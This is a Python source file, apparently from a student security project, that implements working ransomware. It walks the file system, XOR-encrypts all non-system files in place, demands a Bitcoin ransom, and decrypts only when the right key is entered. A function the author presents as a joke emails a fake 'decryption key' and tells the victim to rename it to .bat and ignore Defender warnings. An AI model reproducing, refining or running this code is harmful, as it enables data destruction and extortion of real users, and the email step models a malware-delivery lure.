#ransomware encoder

import os
import hashlib
import smtplib
import ssl
from email.message import EmailMessage
from fileinput import filename
import time
import platform


"""This is the only attack that shouldn't be
ran from the GUI. It encrypts all non system
critical files with XOR cipher."""


def get_target():
    try:
        for root, dirs, files in os.walk(start_dir):
            #checks file again excluded files list
            if any(root.startswith(excluded) for excluded in dirs_to_exclude):
                continue

            for file in files:
                #excludes ransomware and another attack important file
                if file == "ransomware.py" or file == "your_decryption_key.txt":
                    continue
                file_path = os.path.join(root, file)
                encrypt_files(file_path)

                files_to_decrypt.append(file_path)
    except Exception as e:
        print(f"error {e}")

def encrypt_files(file_path):
    try:
        with open(file_path, "rb") as fp:
            file_content = fp.read()

        #uses generated key to switch bits in the selected file
        encrypted_file = bytes([b^key[i % len(key)] for i, b in enumerate(file_content)])

        #replaces file with the encrypted one
        with open(file_path, "wb") as fp:
            fp.write(encrypted_file)

    except Exception as e:
        print(f"Error: {e}")


"""This function is more of a joke for ending my project
presentation. After a successful encryption message appears
and then the program waits a five seconds and sends to selected
email premade message with the .txt file. It tells the user to
download it as a .bat file and that it will give him his decryption
key. When the user tries to then open the .bat file it instead
opens Rick Astley's Never Gonna Give You Up."""


def rick_roll():
    #you can enter your information and make sure it works
    smtp_server = "smtp.gmail.com"
    server_port = 465
    attacker_email = ""
    attacker_password = ""
    victim_email = ""

    message = EmailMessage()
    message["Subject"] = "Your decryption key"
    message["From"] = attacker_email
    message["To"] = victim_email
    message.set_content("Hi this is attacker, thanks for the money, attached is your decryption key. For it to work correctly click Download or save as, then select all types and add .bat after the file name, then open it."
                        "P.S. You may get Defender warning but don't worry, it's because it's unknown file type for windows.")

    context = ssl.create_default_context()

    file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "your_decryption_key.txt")
    print(file_path)

    try:
        with open(file_path, "rb") as rr:
            message.add_attachment(rr.read(), maintype="text", subtype="plain", filename="your_decryption_key.txt")

        with smtplib.SMTP_SSL(smtp_server, server_port, context=context) as server:
            server.login(attacker_email, attacker_password)
            server.send_message(message)
            print("message sent successfully")

    except Exception as e:
        print(f"error {e}")

def decrypt_files():
    #if the user gets the encryption key, this function can decrypt files
    #it uses the same process as for encryption
    for file in files_to_decrypt:
        try:
            with open(file, "rb") as f:
                encrypted_data = f.read()

            decrypted_file = bytes([b^user_key[i % len(user_key)] for i, b in enumerate(encrypted_data)])

            with open(file, "wb") as f:
                f.write(decrypted_file)

        except Exception as e:
            print(f"Whoops error {e} occurred")

files_to_decrypt = []

#differentiates between platforms and accordingly selects files to exclude
#it also sets the starting directory for the file gathering
if platform.system() == "Linux":
    start_dir = "/"
    dirs_to_exclude = ["/bin", "/sbin", "/lib", "/lib64", "/boot", "/etc",
        "/dev", "/sys", "/proc", "/root", "/var", "/tmp",
        "/usr", "/swapfile", "/mnt", "/media", "/run", "/snap", "/flatpak",
        os.path.expanduser("~/.cache"),
        os.path.expanduser("~/.config/JetBrains"),
        os.path.expanduser("~/.local/share/JetBrains"),
        os.path.expanduser("~/Downloads/pycharm-community-2024.3.1.1/plugins"),
        os.path.expanduser("~/.local/share/Trash")
    ]
elif platform.system() == "Windows":
    system_drive = os.environ.get("SystemDrive", "C:\\")
    start_dir = os.path.expanduser("~")
    dirs_to_exclude = [
        os.environ.get("SystemRoot", os.path.join(system_drive, "Windows")),
        os.environ.get("ProgramFiles", os.path.join(system_drive, "Program Files")),
        os.environ.get("ProgramFiles(x86)", os.path.join(system_drive, "Program Files (x86)")),
        os.path.join(system_drive, "Boot"),
        os.path.join(system_drive, "EFI"),
        os.path.join(system_drive, "Recovery"),
        os.path.join(system_drive, "PerfLogs"),
        os.path.join(system_drive, "$Recycle.Bin"),
        os.path.join(system_drive, "System Volume Information"),
        os.path.join(system_drive, "swapfile.sys"),
        os.path.join(system_drive, "pagefile.sys"),
        os.path.join(system_drive, "hiberfil.sys"),
        os.path.expanduser("~\\AppData"),
        os.path.expanduser("~\\AppData\\Local\\Temp"),
        os.path.expanduser("C:\\Users\\Public")
    ]

key = os.urandom(16)
key_hash = hashlib.sha256(key).hexdigest()

print(key.hex())

get_target()

#deletes key from memory so it couldn't be accessed there
del key

print(f"Your files {files_to_decrypt} have been encrypted")
print(f"Pay 10 Bitcoins to get the decryption key")

time.sleep(5)
rick_roll()

user_key_hash = ""
while True:
    try:
        user_key = bytes.fromhex(input("Enter a key to decrypt:")).strip()
        user_key_hash = hashlib.sha256(user_key).hexdigest()
    except Exception as e:
        print("Something went wrong")

    #uses key hash so the key can't be accessed in memory
    #if user enters right key the program continues to deciphering files
    if key_hash == user_key_hash:
        break
    else:
        print("Whoopsie have you entered the wrong key :)")

decrypt_files()